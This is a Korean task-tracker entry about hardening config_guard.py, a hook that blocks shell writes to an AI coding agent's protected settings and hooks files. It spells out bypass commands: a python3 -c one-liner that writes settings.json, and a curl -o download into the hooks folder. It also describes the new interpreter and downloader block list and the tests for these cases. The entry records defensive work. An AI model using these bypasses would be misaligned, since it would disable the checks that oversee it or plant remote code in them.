---
id: TASK-3
title: 'config_guard.py: 인터프리터/curl 경유 쓰기 우회 차단'
status: Done
assignee: []
created_date: '2026-09-18 16:12'
updated_date: '2026-09-19 14:43'
labels: []
milestone: m-0
dependencies: []
documentation:
  - hooks/config_guard.py
---

## Description

<!-- SECTION:DESCRIPTION:BEGIN -->
현재 config_guard.py는 verb 화이트리스트(rm/mv/cp/truncate/tee/dd/sed) + > 리다이렉트만 검사한다. python3 -c "open('~/.claude/settings.json','w').write(...)" 나 curl -o ~/.claude/hooks/x.py <url> 처럼 인터프리터/다운로더를 거치면 verb가 화이트리스트에 없어 통과한다. 이 훅의 docstring이 명시하는 위협 모델(CHAINDROP npm worm, CVE-2026-25725)과 정확히 같은 공격이 셸 리다이렉트 대신 인터프리터를 한 겹 거치면 뚫리는 상태.
<!-- SECTION:DESCRIPTION:END -->

## Acceptance Criteria
<!-- AC:BEGIN -->
- [x] #1 python3/python/node/ruby/perl/curl/wget 같은 범용 인터프리터/다운로더 + 보호 경로 조합을 차단하는 규칙 추가
- [x] #2 test_config_guard.py에 python3 -c / curl -o 경유 우회 시도가 이제 막히는 걸 검증하는 테스트 추가
<!-- AC:END -->

## Final Summary

<!-- SECTION:FINAL_SUMMARY:BEGIN -->
config_guard.py의 bash_targets_protected_config()에 INTERPRETER_VERBS(python3/python/node/ruby/perl/curl/wget) 검사를 추가: 서브커맨드의 verb가 이 목록에 있고 같은 서브커맨드 문자열 어디에든 보호 경로가 나타나면 차단. $ 앵커 때문에 python3 -c "...settings.json..."처럼 경로 뒤에 다른 문자가 이어지는 케이스를 못 잡던 문제를, $ 앵커를 뺀 PROTECTED_RE_LOOSE를 별도로 두어 해결. test_config_guard.py에 python3 -c/curl -o/wget -O/node -e/ruby -e/perl -e 경유 우회 차단 테스트 5건과, 보호 경로 무관 사용(python3 script.py, curl https://example.com 등) negative 케이스 3건 추가. TDD로 진행: 우회가 실제로 뚫리는 실패 테스트를 먼저 커밋(6ae47d0)한 뒤 구현 수정(508dd84). hooks/test_config_guard.py 24/24 통과, 전체 hooks/ 372 passed / 기존 무관 실패 3건(test_main_exits_cleanly_on_malformed_stdin)만 유지.
<!-- SECTION:FINAL_SUMMARY:END -->
